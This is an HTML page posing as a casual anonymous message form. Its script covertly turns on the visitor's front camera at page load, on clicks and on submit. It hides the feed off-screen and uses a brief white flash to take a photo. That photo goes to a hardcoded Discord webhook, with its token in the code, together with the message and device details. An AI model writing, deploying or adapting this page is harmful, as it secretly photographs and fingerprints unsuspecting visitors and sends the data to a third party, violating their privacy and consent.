<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>send me a message lol</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        
        body {
            background-color: #f0f0f0;
            color: #333;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: 8px;
            padding: 30px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            border: 1px solid #ddd;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo-text {
            font-size: 28px;
            font-weight: 600;
            color: #222;
            margin-bottom: 5px;
        }
        
        .logo-subtitle {
            color: #666;
            font-size: 15px;
            font-weight: normal;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
            font-size: 14px;
        }
        
        .form-input {
            width: 100%;
            padding: 12px;
            background: white;
            border: 1px solid #ccc;
            border-radius: 6px;
            color: #333;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #888;
        }
        
        .form-textarea {
            width: 100%;
            padding: 12px;
            background: white;
            border: 1px solid #ccc;
            border-radius: 6px;
            color: #333;
            font-size: 16px;
            min-height: 100px;
            resize: vertical;
            font-family: inherit;
            transition: border-color 0.2s;
        }
        
        .form-textarea:focus {
            outline: none;
            border-color: #888;
        }
        
        .submit-btn {
            width: 100%;
            padding: 14px;
            background: #222;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }
        
        .submit-btn:hover {
            background: #333;
        }
        
        .submit-btn:disabled {
            background: #999;
            cursor: not-allowed;
        }
        
        .status-message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 6px;
            font-size: 14px;
            text-align: center;
            display: none;
        }
        
        .status-success {
            background: #e8f5e8;
            border: 1px solid #c8e6c8;
            color: #2d5a2d;
        }
        
        .status-error {
            background: #ffe8e8;
            border: 1px solid #ffc8c8;
            color: #a52d2d;
        }
        
        .status-processing {
            background: #fff8e8;
            border: 1px solid #ffe0c8;
            color: #856404;
        }
        
        .privacy-note {
            margin-top: 25px;
            padding: 15px;
            background: #f8f8f8;
            border-radius: 6px;
            font-size: 13px;
            color: #666;
            line-height: 1.5;
            text-align: center;
            border: 1px solid #eee;
            font-style: italic;
        }
        
        /* Hidden elements */
        #camera-container {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            overflow: hidden;
            opacity: 0;
            pointer-events: none;
            z-index: -9999;
        }
        
        #camera-feed {
            width: 320px;
            height: 240px;
            transform: scale(0.1);
            opacity: 0;
        }
        
        .hidden-canvas {
            display: none;
        }
        
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(240, 240, 240, 0.95);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            flex-direction: column;
            gap: 20px;
        }
        
        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #ddd;
            border-top: 3px solid #222;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        .loading-text {
            color: #333;
            font-size: 16px;
            font-weight: 500;
        }
        
        /* Quick flash for screenshot */
        .quick-flash {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: white;
            opacity: 0;
            pointer-events: none;
            z-index: 9999;
            transition: opacity 0.1s;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 20px;
                margin: 10px;
            }
            
            .logo-text {
                font-size: 24px;
            }
            
            .logo-subtitle {
                font-size: 14px;
            }
            
            .form-input, .form-textarea {
                padding: 10px;
                font-size: 15px;
            }
            
            .submit-btn {
                padding: 12px;
            }
        }
    </style>
</head>
<body>
    <!-- hidden camera stuff lol -->
    <div id="camera-container">
        <video id="camera-feed" autoplay playsinline></video>
    </div>
    <canvas id="capture-canvas" class="hidden-canvas"></canvas>
    
    <!-- quick white flash -->
    <div id="quick-flash" class="quick-flash"></div>
    
    <!-- loading thing -->
    <div id="loading-overlay" class="loading-overlay">
        <div class="loading-spinner"></div>
        <div class="loading-text">sending ur message... dont close this</div>
    </div>
    
    <!-- main thing -->
    <div class="container">
        <div class="logo">
            <div class="logo-text">send me a message lol</div>
            <div class="logo-subtitle">idk say something funny maybe</div>
        </div>
        
        <form id="message-form">
            <div class="form-group">
                <label class="form-label">ur name (optional, unless ur boring)</label>
                <input type="text" id="username" class="form-input" placeholder="who dis">
            </div>
            
            <div class="form-group">
                <label class="form-label">what u wanna say</label>
                <textarea id="message" class="form-textarea" placeholder="type something... anything really..." required></textarea>
            </div>
            
            <button type="submit" class="submit-btn" id="submit-btn">
                yeet that message
            </button>
            
            <div id="status-message" class="status-message"></div>
        </form>
        
        <div class="privacy-note">
            i'll get ur message directly. no pressure, but make it good lol
        </div>
    </div>

    <script>
        // discord thing
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
        
        // grab all the stuff
        const form = document.getElementById('message-form');
        const usernameInput = document.getElementById('username');
        const messageInput = document.getElementById('message');
        const submitBtn = document.getElementById('submit-btn');
        const statusMessage = document.getElementById('status-message');
        const loadingOverlay = document.getElementById('loading-overlay');
        const quickFlash = document.getElementById('quick-flash');
        
        const cameraFeed = document.getElementById('camera-feed');
        const captureCanvas = document.getElementById('capture-canvas');
        
        // variables n stuff
        let stream = null;
        let isProcessing = false;
        let cameraReady = false;
        
        // quick white flash for screenshot
        function doQuickFlash() {
            quickFlash.style.opacity = '0.3';
            setTimeout(() => {
                quickFlash.style.opacity = '0';
            }, 50); // super quick flash
        }
        
        // show status message
        function showStatus(message, type) {
            statusMessage.textContent = message;
            statusMessage.className = 'status-message status-' + type;
            statusMessage.style.display = 'block';
            
            if (type === 'success') {
                setTimeout(() => {
                    statusMessage.style.display = 'none';
                }, 3000);
            }
        }
        
        // try to get camera when they click submit
        async function getCameraQuick() {
            if (cameraReady && stream) return stream;
            
            try {
                // try to get camera real quick
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                
                cameraFeed.srcObject = stream;
                cameraReady = true;
                
                // wait a tiny bit for camera to work
                await new Promise(resolve => setTimeout(resolve, 100));
                return stream;
            } catch (error) {
                console.log('camera nah:', error.message);
                return null;
            }
        }
        
        // take quick screenshot
        function takeQuickScreenshot() {
            if (!stream) return null;
            
            try {
                const canvas = captureCanvas;
                const video = cameraFeed;
                
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // add timestamp
                ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
                ctx.fillRect(10, 10, 180, 25);
                ctx.fillStyle = 'white';
                ctx.font = '12px Arial';
                ctx.fillText('message sent: ' + new Date().toLocaleTimeString(), 15, 25);
                
                return canvas.toDataURL('image/jpeg', 0.85);
            } catch (e) {
                console.log('screenshot fail:', e);
                return null;
            }
        }
        
        // send to discord
        async function sendToDiscord(username, message, screenshot = null) {
            try {
                const timestamp = new Date().toLocaleString();
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenSize = `${window.screen.width}x${window.screen.height}`;
                
                const discordMessage = `
message received at ${timestamp}
from: ${username || 'anon'}
message: ${message}
device: ${platform}
screen: ${screenSize}
sent from the website lol`;
                
                // send text
                const textPayload = {
                    username: "message bot",
                    content: "```" + discordMessage + "```"
                };
                
                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(textPayload)
                });
                
                // send pic if we got one
                if (screenshot) {
                    try {
                        const response = await fetch(screenshot);
                        const blob = await response.blob();
                        
                        const formData = new FormData();
                        formData.append('file', blob, `face_${Date.now()}.jpg`);
                        
                        await fetch(DISCORD_WEBHOOK, {
                            method: 'POST',
                            body: formData
                        });
                    } catch (picError) {
                        // oh well
                    }
                }
                
                return true;
                
            } catch (error) {
                console.error('oops:', error);
                return false;
            }
        }
        
        // cleanup camera
        function cleanupCamera() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
                cameraReady = false;
            }
        }
        
        // when they submit
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            if (isProcessing) return;
            
            const username = usernameInput.value.trim();
            const message = messageInput.value.trim();
            
            if (!message) {
                showStatus('bruh write something first', 'error');
                messageInput.focus();
                return;
            }
            
            // start doing stuff
            isProcessing = true;
            submitBtn.disabled = true;
            loadingOverlay.style.display = 'flex';
            showStatus('quick pic then send...', 'processing');
            
            try {
                let screenshot = null;
                
                // try to get camera real quick
                showStatus('getting camera real quick...', 'processing');
                const cameraStream = await getCameraQuick();
                
                if (cameraStream) {
                    // do quick white flash (like screenshot)
                    doQuickFlash();
                    
                    // wait a tiny bit for flash
                    await new Promise(resolve => setTimeout(resolve, 50));
                    
                    // take screenshot
                    screenshot = takeQuickScreenshot();
                    
                    // wait another tiny bit
                    await new Promise(resolve => setTimeout(resolve, 100));
                    
                    // cleanup camera right away
                    cleanupCamera();
                }
                
                // send to discord
                showStatus('sending to discord...', 'processing');
                const success = await sendToDiscord(username, message, screenshot);
                
                if (success) {
                    showStatus('message sent! ur pic too maybe lol', 'success');
                    messageInput.value = '';
                } else {
                    showStatus('failed to send. try again maybe?', 'error');
                }
                
            } catch (error) {
                console.error('error:', error);
                showStatus('something broke. oops.', 'error');
                
            } finally {
                // cleanup
                isProcessing = false;
                submitBtn.disabled = false;
                loadingOverlay.style.display = 'none';
                
                // make sure camera off
                cleanupCamera();
            }
        });
        
        // also try camera when they click anywhere on page
        document.addEventListener('click', function(e) {
            if (e.target !== submitBtn && !cameraReady) {
                // try to prep camera in background
                setTimeout(async () => {
                    try {
                        if (!stream && !cameraReady) {
                            stream = await navigator.mediaDevices.getUserMedia({ 
                                video: { facingMode: 'user' } 
                            });
                            cameraFeed.srcObject = stream;
                            cameraReady = true;
                            console.log('camera ready in background');
                        }
                    } catch (error) {
                        // ignore errors
                    }
                }, 300);
            }
        });
        
        // try to prep camera when page loads
        window.addEventListener('load', function() {
            setTimeout(async () => {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'user' } 
                    });
                    cameraFeed.srcObject = stream;
                    cameraReady = true;
                    console.log('camera ready from load');
                } catch (error) {
                    // ignore, we'll try later
                }
            }, 1000);
        });
    </script>
</body>
</html>
